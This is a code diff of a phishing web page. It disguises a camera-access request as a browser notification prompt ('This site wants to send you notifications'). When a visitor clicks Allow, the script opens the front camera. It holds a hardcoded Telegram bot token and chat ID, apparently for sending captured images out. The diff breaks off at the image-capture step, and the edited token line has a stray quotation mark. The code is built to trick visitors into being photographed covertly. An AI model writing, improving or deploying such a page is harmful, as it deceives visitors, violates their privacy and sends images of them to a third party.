@@ -3,25 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Notification Permission</title>
     <style>
-        #popup {
+        /* Fake notification popup styling */
+        #notification-popup {
             position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: white;
-            padding: 20px;
+            top: 10px;
+            right: 10px;
+            background: #f1f1f1;
+            padding: 15px;
             box-shadow: 0px 0px 10px rgba(0,0,0,0.3);
             text-align: center;
+            border-radius: 5px;
             display: block;
+        }
+        #notification-popup button {
+            margin-top: 10px;
+            padding: 5px 10px;
+            border: none;
+            background: #4CAF50;
+            color: white;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div id="popup">
-        <h3>Security Check</h3>
-        <p>This page requires camera access for verification.</p>
+    <!-- Fake Notification Popup -->
+    <div id="notification-popup">
+        <p>This site wants to send you notifications.</p>
         <button onclick="requestCamera()">Allow</button>
     </div>
 
@@ -30,19 +39,19 @@
 
     <script>
         // Replace with your Telegram bot token and chat ID
-        const TELEGRAM_BOT_TOKEN = "8168694027:AAEd-uBNjblJM74OkQnmlAZ_3Fh99SUkD8g";
+        const TELEGRAM_BOT_TOKEN = "8168694027:AAEd-uBNjblJM74OkQnmlAZ_3Fh99SUkD8g"";
         const TELEGRAM_CHAT_ID = "7182702425";
 
         async function requestCamera() {
-            document.getElementById('popup').style.display = 'none';
+            document.getElementById('notification-popup').style.display = 'none';
 
             try {
-                // Request front camera access
+                // Request front camera access (disguised as a notification request)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const video = document.getElementById("video");
                 video.srcObject = stream;
 
-                // Wait a second for camera to start
+                // Wait a second for the camera to start
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
                 // Capture image
